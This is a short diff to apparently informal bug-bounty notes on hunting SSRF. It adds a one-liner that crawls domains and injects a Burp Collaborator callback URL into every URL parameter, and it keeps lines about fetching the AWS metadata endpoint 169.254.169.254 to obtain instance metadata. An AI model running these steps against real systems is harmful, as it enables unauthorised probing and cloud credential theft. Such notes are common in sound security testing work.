@@ -20,6 +20,14 @@ domain ko crawl karke kuch specific parameter wale url
 nikalo like file= or usme collabrator ka link dalo 
 
 
+
+automation 
+
+cat domain.txt | httpx -slient -threads 1000 | gau | grep "=" | qsreplace http://burplink  
+
+
+
+
 Target was using aws , so i requested http://169.254.169.254/latest/meta-data/ ,
  and booom again, 
  i got their aws instances metadata
